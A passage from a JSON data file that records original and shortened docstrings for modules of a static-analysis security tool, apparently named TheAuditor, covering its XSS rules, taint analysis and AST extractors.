    "original": "\"\"\"Orchestrator-compatible entry point.\n\n    This is the standardized interface that the orchestrator expects.\n    Delegates to the main implementation function for backward compatibility.\n    \"\"\"",
    "truncated": "\"\"\"Orchestrator-compatible entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/hooks_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get all files using Vue Composition API.\n\n    Schema contract (v1.1+) guarantees all tables exist.\n    If table is missing, we WANT the rule to crash to expose indexer bugs.\n    \"\"\"",
    "truncated": "\"\"\"Get all files using Vue Composition API.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/hooks_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Orchestrator-compatible entry point.\n\n    This is the standardized interface that the orchestrator expects.\n    Delegates to the main implementation function for backward compatibility.\n    \"\"\"",
    "truncated": "\"\"\"Orchestrator-compatible entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/lifecycle_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get all Vue-related files from the database.\n\n    Schema contract (v1.1+) guarantees all tables exist.\n    If table is missing, we WANT the rule to crash to expose indexer bugs.\n    \"\"\"",
    "truncated": "\"\"\"Get all Vue-related files from the database.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/lifecycle_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Orchestrator-compatible entry point.\n\n    This is the standardized interface that the orchestrator expects.\n    Delegates to the main implementation function for backward compatibility.\n    \"\"\"",
    "truncated": "\"\"\"Orchestrator-compatible entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/reactivity_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Orchestrator-compatible entry point.\n\n    This is the standardized interface that the orchestrator expects.\n    Delegates to the main implementation function for backward compatibility.\n    \"\"\"",
    "truncated": "\"\"\"Orchestrator-compatible entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/render_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get all Vue-related files from the database.\n\n    Schema contract (v1.1+) guarantees all tables exist.\n    If table is missing, we WANT the rule to crash to expose indexer bugs.\n    \"\"\"",
    "truncated": "\"\"\"Get all Vue-related files from the database.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/render_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Orchestrator-compatible entry point.\n\n    This is the standardized interface that the orchestrator expects.\n    Delegates to the main implementation function for backward compatibility.\n    \"\"\"",
    "truncated": "\"\"\"Orchestrator-compatible entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/state_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get all Vuex/Pinia store files.\n\n    Schema contract (v1.1+) guarantees all tables exist.\n    If table is missing, we WANT the rule to crash to expose indexer bugs.\n    \"\"\"",
    "truncated": "\"\"\"Get all Vuex/Pinia store files.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/state_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Orchestrator-compatible entry point.\n\n    This is the standardized interface that the orchestrator expects.\n    Delegates to the main implementation function for backward compatibility.\n    \"\"\"",
    "truncated": "\"\"\"Orchestrator-compatible entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/__init__.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"XSS vulnerability detection rules module - Framework-Aware Orchestrator.\n\nThis module orchestrates all XSS analyzers based on detected frameworks.\nDramatically reduces false positives by understanding framework context.\n\"\"\"",
    "truncated": "\"\"\"XSS vulnerability detection rules module - Framework-Aware Orchestrator.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/constants.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Check if expression contains a sanitizer CALL (not just mention).\n\n    Uses SANITIZER_CALL_PATTERNS to ensure we're checking for actual\n    function calls like \"escape(input)\" not definitions like \"const escape = ...\".\n    \"\"\"",
    "truncated": "\"\"\"Check if expression contains a sanitizer CALL (not just mention).\"\"\""
  },
  {
    "file": "theauditor/rules/xss/dom_xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Detect DOM-based XSS vulnerabilities.\n\n    Returns:\n        List of DOM XSS findings\n    \"\"\"",
    "truncated": "\"\"\"Detect DOM-based XSS vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/dom_xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Orchestrator-compatible entry point.\n\n    This is the standardized interface that the orchestrator expects.\n    Delegates to the main implementation function for backward compatibility.\n    \"\"\"",
    "truncated": "\"\"\"Orchestrator-compatible entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/dom_xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"DOM-specific XSS Detection.\n\nThis module detects DOM-based XSS vulnerabilities that occur in client-side JavaScript.\nThese are particularly dangerous as they can bypass server-side protections.\n\"\"\"",
    "truncated": "\"\"\"DOM-specific XSS Detection.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/express_xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Detect Express.js-specific XSS vulnerabilities.\n\n    Returns:\n        List of Express-specific XSS findings\n    \"\"\"",
    "truncated": "\"\"\"Detect Express.js-specific XSS vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/express_xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Orchestrator-compatible entry point.\n\n    This is the standardized interface that the orchestrator expects.\n    Delegates to the main implementation function for backward compatibility.\n    \"\"\"",
    "truncated": "\"\"\"Orchestrator-compatible entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/express_xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Express.js-specific XSS Detection.\n\nThis module detects XSS vulnerabilities specific to Express.js applications.\nUses database-only approach with framework awareness.\n\"\"\"",
    "truncated": "\"\"\"Express.js-specific XSS Detection.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/react_xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Detect React-specific XSS vulnerabilities.\n\n    Returns:\n        List of React-specific XSS findings\n    \"\"\"",
    "truncated": "\"\"\"Detect React-specific XSS vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/react_xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Orchestrator-compatible entry point.\n\n    This is the standardized interface that the orchestrator expects.\n    Delegates to the main implementation function for backward compatibility.\n    \"\"\"",
    "truncated": "\"\"\"Orchestrator-compatible entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/react_xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"React-specific XSS Detection.\n\nThis module detects XSS vulnerabilities specific to React applications.\nUses database-only approach with React component awareness.\n\"\"\"",
    "truncated": "\"\"\"React-specific XSS Detection.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/template_xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Orchestrator-compatible entry point.\n\n    This is the standardized interface that the orchestrator expects.\n    Delegates to the main implementation function for backward compatibility.\n    \"\"\"",
    "truncated": "\"\"\"Orchestrator-compatible entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/vue_xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Check if this is a Vue.js application.\n\n    NO FALLBACK: Removed symbol scan heuristic per ZERO FALLBACK POLICY.\n    Trust frameworks table and vue_components table only.\n    \"\"\"",
    "truncated": "\"\"\"Check if this is a Vue.js application.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/vue_xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Orchestrator-compatible entry point.\n\n    This is the standardized interface that the orchestrator expects.\n    Delegates to the main implementation function for backward compatibility.\n    \"\"\"",
    "truncated": "\"\"\"Orchestrator-compatible entry point.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Check Vue v-html directives with user input.\n\n    NO FALLBACKS. Schema contract guarantees vue_directives table exists.\n    If table missing, rule MUST crash to expose indexer bug.\n    \"\"\"",
    "truncated": "\"\"\"Check Vue v-html directives with user input.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/xss_analyze.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Orchestrator-compatible entry point.\n\n    This is the standardized interface that the orchestrator expects.\n    Delegates to the main implementation function for backward compatibility.\n    \"\"\"",
    "truncated": "\"\"\"Orchestrator-compatible entry point.\"\"\""
  },
  {
    "file": "theauditor/session/analysis.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get correlation statistics (workflow compliance vs outcomes).\n\n        Returns:\n            Dict with statistical summary\n        \"\"\"",
    "truncated": "\"\"\"Get correlation statistics (workflow compliance vs outcomes).\"\"\""
  },
  {
    "file": "theauditor/session/store.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Store session execution (dual-write: DB + JSON).\n\n        Args:\n            execution: SessionExecution object to store\n        \"\"\"",
    "truncated": "\"\"\"Store session execution (dual-write: DB + JSON).\"\"\""
  },
  {
    "file": "theauditor/session/store.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Write session execution to database.\n\n        Args:\n            execution: SessionExecution object\n        \"\"\"",
    "truncated": "\"\"\"Write session execution to database.\"\"\""
  },
  {
    "file": "theauditor/session/store.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Write session execution to JSON file.\n\n        Args:\n            execution: SessionExecution object\n        \"\"\"",
    "truncated": "\"\"\"Write session execution to JSON file.\"\"\""
  },
  {
    "file": "theauditor/session/store.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get aggregate statistics from session executions.\n\n        Returns:\n            Dict with statistical summary\n        \"\"\"",
    "truncated": "\"\"\"Get aggregate statistics from session executions.\"\"\""
  },
  {
    "file": "theauditor/session/workflow_checker.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize workflow checker.\n\n        Args:\n            workflow_path: Path to planning.md (optional)\n        \"\"\"",
    "truncated": "\"\"\"Initialize workflow checker.\"\"\""
  },
  {
    "file": "theauditor/session/workflow_checker.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Parse workflows from planning.md.\n\n        Returns:\n            Dict of workflow definitions\n        \"\"\"",
    "truncated": "\"\"\"Parse workflows from planning.md.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get registry statistics for debugging.\n\n        Returns:\n            Dictionary with simple total counts\n        \"\"\"",
    "truncated": "\"\"\"Get registry statistics for debugging.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Check if there's a sanitizer call between source and sink in the same function.\n\n    Schema Contract:\n        Queries symbols table (guaranteed to exist)\n    \"\"\"",
    "truncated": "\"\"\"Check if there's a sanitizer call between source and sink in the same function.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Deduplicate taint paths while preserving the most informative flow for each source-sink pair.\n\n    Key rule: Prefer cross-file / multi-hop and flow-sensitive paths over shorter, same-file variants.\n    This prevents the Stage 2 direct path (2 steps) from overwriting Stage 3 multi-hop results.\n    \"\"\"",
    "truncated": "\"\"\"Deduplicate taint paths while preserving the most informative flow for each source-sink pair.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Filter sinks to same module as source for performance.\n\n            Reduces O(sources × sinks) from 4M to ~400K combinations.\n            ZERO FALLBACK: Returns empty list if source file missing (discovery bug).\n            \"\"\"",
    "truncated": "\"\"\"Filter sinks to same module as source for performance.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Resolves ALL control flows in codebase to populate resolved_flow_audit table.\n\n    This class implements the \"Code-to-Truth Compiler\" that transforms sprawling\n    codebases into structured knowledge that AI can query without reading source code.\n    \"\"\"",
    "truncated": "\"\"\"Resolves ALL control flows in codebase to populate resolved_flow_audit table.\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Demand-driven taint analyzer using IFDS backward reachability.\n\n    Uses pre-computed graphs from DFGBuilder and PathCorrelator instead of\n    rebuilding data flow on every run.\n    \"\"\"",
    "truncated": "\"\"\"Demand-driven taint analyzer using IFDS backward reachability.\"\"\""
  },
  {
    "file": "theauditor/taint/sanitizer_util.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Load validation framework sanitizers from database.\n\n        These are middleware/decorators that validate/sanitize input\n        (e.g., Zod schemas, Express validators, Pydantic models).\n        \"\"\"",
    "truncated": "\"\"\"Load validation framework sanitizers from database.\"\"\""
  },
  {
    "file": "theauditor/taint/sanitizer_util.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Pre-load function_call_args into memory to eliminate DB queries in hot loop.\n\n        ARCHITECTURAL FIX: Converts O(paths × hops) SQL queries to O(1) hash lookups.\n        For 10k paths × 8 hops = 80k queries eliminated.\n        \"\"\"",
    "truncated": "\"\"\"Pre-load function_call_args into memory to eliminate DB queries in hot loop.\"\"\""
  },
  {
    "file": "theauditor/taint/sanitizer_util.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Registry for sanitizer patterns and validation frameworks.\n\n    Provides unified sanitizer detection logic for all taint engines.\n    Loads safe sinks and validation sanitizers from database once.\n    \"\"\"",
    "truncated": "\"\"\"Registry for sanitizer patterns and validation frameworks.\"\"\""
  },
  {
    "file": "theauditor/taint/schema_cache_adapter.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Find security sinks using cache - adapter method.\n\n        ZERO FALLBACK POLICY: Use sinks_dict from TaintRegistry, no hardcoded patterns.\n        This adapter is temporary (will be removed in Phase 4).\n        \"\"\"",
    "truncated": "\"\"\"Find security sinks using cache - adapter method.\"\"\""
  },
  {
    "file": "theauditor/taint/taint_path.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Classify the vulnerability based on sink type - factual categorization.\n\n        Uses sink category from discovery (populated by database queries).\n        ZERO FALLBACK POLICY: If category missing, return generic type.\n        \"\"\"",
    "truncated": "\"\"\"Classify the vulnerability based on sink type - factual categorization.\"\"\""
  },
  {
    "file": "theauditor/taint/taint_path.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"TaintPath data model for representing taint flow paths.\n\nMoved from core.py to break circular dependency (core.py ↔ ifds_analyzer.py).\nThis is a pure data model with no external dependencies.\n\"\"\"",
    "truncated": "\"\"\"TaintPath data model for representing taint flow paths.\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize builder with database path.\n\n        Args:\n            db_path: Path to repo_index.db\n        \"\"\"",
    "truncated": "\"\"\"Initialize builder with database path.\"\"\""
  },
  {
    "file": "theauditor/tools.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Detect tool version by running command.\n\n    Returns version string or \"missing\" if not found.\n    \"\"\"",
    "truncated": "\"\"\"Detect tool version by running command.\"\"\""
  },
  {
    "file": "theauditor/universal_detector.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Query files from database.\n\n        Returns:\n            List of (full_path, extension, sha256) tuples\n        \"\"\"",
    "truncated": "\"\"\"Query files from database.\"\"\""
  },
  {
    "file": "theauditor/universal_detector.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Query specific files from database.\n\n        Returns:\n            List of (full_path, extension, sha256) tuples\n        \"\"\"",
    "truncated": "\"\"\"Query specific files from database.\"\"\""
  },
  {
    "file": "theauditor/universal_detector.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Process AST-parseable files through orchestrator.\n\n        Args:\n            files: List of (path, ext, sha256) tuples\n        \"\"\"",
    "truncated": "\"\"\"Process AST-parseable files through orchestrator.\"\"\""
  },
  {
    "file": "theauditor/universal_detector.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Run database-level rules through orchestrator.\n\n        Returns:\n            List of findings from database rules\n        \"\"\"",
    "truncated": "\"\"\"Run database-level rules through orchestrator.\"\"\""
  },
  {
    "file": "theauditor/universal_detector.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get summary statistics of findings.\n\n        Returns:\n            Dictionary with summary stats\n        \"\"\"",
    "truncated": "\"\"\"Get summary statistics of findings.\"\"\""
  },
  {
    "file": "theauditor/utils/code_snippets.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize snippet manager.\n\n        Args:\n            root_dir: Project root directory for resolving relative paths\n        \"\"\"",
    "truncated": "\"\"\"Initialize snippet manager.\"\"\""
  },
  {
    "file": "theauditor/utils/code_snippets.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Return cache statistics.\n\n        Returns:\n            Dict with cache info\n        \"\"\"",
    "truncated": "\"\"\"Return cache statistics.\"\"\""
  },
  {
    "file": "theauditor/utils/constants.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Centralized constants for TheAuditor utils package.\n\nThis module provides a single source of truth for paths, directories,\nand configuration values used across utility modules.\n\"\"\"",
    "truncated": "\"\"\"Centralized constants for TheAuditor utils package.\"\"\""
  },
  {
    "file": "theauditor/utils/exit_codes.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Centralized exit codes for TheAuditor CLI.\n\nThis module provides a single source of truth for all program exit codes,\neliminating magic numbers and ensuring consistency across the application.\n\"\"\"",
    "truncated": "\"\"\"Centralized exit codes for TheAuditor CLI.\"\"\""
  },
  {
    "file": "theauditor/utils/memory.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get currently available system memory in MB.\n\n    Returns:\n        Available memory in MB, or -1 if cannot detect\n    \"\"\"",
    "truncated": "\"\"\"Get currently available system memory in MB.\"\"\""
  },
  {
    "file": "theauditor/utils/memory.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Memory management utilities for TheAuditor.\n\nThis module provides intelligent memory limit detection based on system resources.\nPhilosophy: SAST tools need RAM. If you're running complex analysis, allocate accordingly.\n\"\"\"",
    "truncated": "\"\"\"Memory management utilities for TheAuditor.\"\"\""
  },
  {
    "file": "theauditor/utils/toolbox.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get path to OSV-Scanner offline database directory.\n\n        Returns:\n            Path to database directory (may not exist yet)\n        \"\"\"",
    "truncated": "\"\"\"Get path to OSV-Scanner offline database directory.\"\"\""
  },
  {
    "file": "theauditor/utils/toolbox.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get path to ESLint flat config in sandbox.\n\n        Returns:\n            Path to eslint.config.cjs\n        \"\"\"",
    "truncated": "\"\"\"Get path to ESLint flat config in sandbox.\"\"\""
  },
  {
    "file": "theauditor/utils/toolbox.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get path to Python linter config (pyproject.toml) in sandbox.\n\n        Returns:\n            Path to pyproject.toml\n        \"\"\"",
    "truncated": "\"\"\"Get path to Python linter config (pyproject.toml) in sandbox.\"\"\""
  },
  {
    "file": "theauditor/utils/toolbox.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get path to TypeScript config in sandbox.\n\n        Returns:\n            Path to tsconfig.json\n        \"\"\"",
    "truncated": "\"\"\"Get path to TypeScript config in sandbox.\"\"\""
  },
  {
    "file": "theauditor/utils/validation_debug.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Check if validation debug logging is enabled.\n\n    Returns:\n        True if THEAUDITOR_VALIDATION_DEBUG=1 is set\n    \"\"\"",
    "truncated": "\"\"\"Check if validation debug logging is enabled.\"\"\""
  },
  {
    "file": "theauditor/vulnerability_scanner.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Main entry point - run all detection sources and cross-reference.\n\n        Returns:\n            List of validated findings\n        \"\"\"",
    "truncated": "\"\"\"Main entry point - run all detection sources and cross-reference.\"\"\""
  },
  {
    "file": "theauditor/vulnerability_scanner.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Load packages from package_configs table.\n\n        Returns:\n            List of package dicts with name, version, manager, file\n        \"\"\"",
    "truncated": "\"\"\"Load packages from package_configs table.\"\"\""
  },
  {
    "file": "theauditor/vulnerability_scanner.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Run npm audit using sandboxed node runtime.\n\n        Returns:\n            List of vulnerability findings from npm audit\n        \"\"\"",
    "truncated": "\"\"\"Run npm audit using sandboxed node runtime.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/base.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Get the name from an AST node, handling different node types.\n\n    Works with Python's built-in AST nodes.\n    \"\"\"",
    "truncated": "\"\"\"Get the name from an AST node, handling different node types.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/base.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Extract all variable names from a Python expression.\n\n    Walks the AST to find all Name and Attribute nodes.\n    \"\"\"",
    "truncated": "\"\"\"Extract all variable names from a Python expression.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/base.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find the function containing a node in Tree-sitter AST.\n\n    Walks up the tree to find parent function, handling all modern JS/TS patterns.\n    \"\"\"",
    "truncated": "\"\"\"Find the function containing a node in Tree-sitter AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/base.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Detect language from file extension.\n\n    Returns empty string for unsupported languages.\n    \"\"\"",
    "truncated": "\"\"\"Detect language from file extension.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/behavioral_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return string value for constant nodes.\n\n    Handles both Python 3.8+ ast.Constant and legacy ast.Str nodes.\n    \"\"\"",
    "truncated": "\"\"\"Return string value for constant nodes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/cfg_extractor.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Extract control flow graphs for all Python functions.\n\n    Returns CFG data matching the database schema expectations.\n    \"\"\"",
    "truncated": "\"\"\"Extract control flow graphs for all Python functions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/core_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Extract export statements from Python AST.\n\n    In Python, all top-level functions, classes, and assignments are \"exported\".\n    \"\"\"",
    "truncated": "\"\"\"Extract export statements from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/data_flow_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return string value for constant nodes.\n\n    Handles both Python 3.8+ ast.Constant and legacy ast.Str nodes.\n    \"\"\"",
    "truncated": "\"\"\"Return string value for constant nodes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_web_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return string value for constant nodes.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Return string value for constant nodes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_web_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Fetch keyword argument by name from AST call.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Fetch keyword argument by name from AST call.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_web_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Helper: Extract list/tuple of string constants as comma-separated string.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Helper: Extract list/tuple of string constants as comma-separated string.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/exception_flow_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return string value for constant nodes.\n\n    Handles both Python 3.8+ ast.Constant and legacy ast.Str nodes.\n    \"\"\"",
    "truncated": "\"\"\"Return string value for constant nodes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/exception_flow_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Classify resource type from context expression.\n\n        Returns: 'file' | 'lock' | 'database' | 'network' | None\n        \"\"\"",
    "truncated": "\"\"\"Classify resource type from context expression.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return string value for constant nodes.\n\n    Handles both Python 3.8+ ast.Constant and legacy ast.Str nodes.\n    \"\"\"",
    "truncated": "\"\"\"Return string value for constant nodes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/orm_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return string value for constant nodes.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Return string value for constant nodes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/orm_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Fetch keyword argument by name from AST call.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Fetch keyword argument by name from AST call.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/orm_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return boolean value for constant/literal nodes.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Return boolean value for constant/literal nodes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/performance_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return string value for constant nodes.\n\n    Handles both Python 3.8+ ast.Constant and legacy ast.Str nodes.\n    \"\"\"",
    "truncated": "\"\"\"Return string value for constant nodes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/state_mutation_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return string value for constant nodes.\n\n    Handles both Python 3.8+ ast.Constant and legacy ast.Str nodes.\n    \"\"\"",
    "truncated": "\"\"\"Return string value for constant nodes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/state_mutation_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find the function containing this line.\n\n        Returns tuple: (function_name, is_property_setter, is_dunder)\n        \"\"\"",
    "truncated": "\"\"\"Find the function containing this line.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/state_mutation_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find the function containing this line.\n\n        Returns tuple: (function_name, is_classmethod)\n        \"\"\"",
    "truncated": "\"\"\"Find the function containing this line.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/task_graphql_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return string value for constant nodes.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Return string value for constant nodes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/task_graphql_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Fetch keyword argument by name from AST call.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Fetch keyword argument by name from AST call.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/task_graphql_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return boolean value for constant/literal nodes.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Return boolean value for constant/literal nodes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/task_graphql_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Extract dependency target from Depends() call.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Extract dependency target from Depends() call.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/type_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Extract Literal type string from AST node.\n\n    Converts Literal[\"a\", \"b\"] to string representation.\n    \"\"\"",
    "truncated": "\"\"\"Extract Literal type string from AST node.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/utils/context.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Shared context for file extraction with O(1) node lookups.\n\n    Built ONCE per file, used by ALL extractors.\n    \"\"\"",
    "truncated": "\"\"\"Shared context for file extraction with O(1) node lookups.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/utils/node_index.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Fast AST node lookup by type.\n\n    Builds index in single pass, enables O(1) queries.\n    \"\"\"",
    "truncated": "\"\"\"Fast AST node lookup by type.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/validation_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return string value for constant nodes.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Return string value for constant nodes.\"\"\""
  },
  {
